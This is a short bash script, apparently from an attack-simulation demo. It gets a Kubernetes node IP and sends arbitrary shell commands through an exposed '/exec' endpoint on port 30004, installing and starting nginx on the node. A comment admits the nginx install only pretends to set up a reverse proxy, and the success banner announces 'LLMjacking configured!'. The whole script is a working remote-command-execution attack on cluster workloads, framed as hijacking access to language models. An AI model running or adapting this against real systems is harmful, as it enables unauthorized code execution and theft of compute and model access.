#!/bin/bash

# NOTE(curtis - don't remove this comment): We are just installing nginx to
# pretend that we are installing a reverse proxy.

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Get Node IP and Port
NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30004

echo -e "${BLUE}[*] Setting up reverse proxy...${NC}"

# Update apt
echo -e "${BLUE}[*] Updating package lists...${NC}"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=apt update"

# Install nginx
echo -e "${BLUE}[*] Installing reverse proxy...${NC}"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=apt install -y nginx"

# Start reverse proxy service
echo -e "${BLUE}[*] Starting reverse proxy service...${NC}"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nginx"

# Check if reverse proxy is running
RESPONSE=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=ps aux | grep nginx")

if [[ $RESPONSE == *"nginx: master process"* ]]; then
    echo
    echo -e "${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║           SUCCESS: Reverse proxy installed!            ║${NC}"
    echo -e "${GREEN}║              Service is up and running                 ║${NC}"
    echo -e "${GREEN}║                LLMjacking configured!                  ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
    echo
else
    echo -e "\n${RED}[-] Failed to install reverse proxy${NC}"
fi 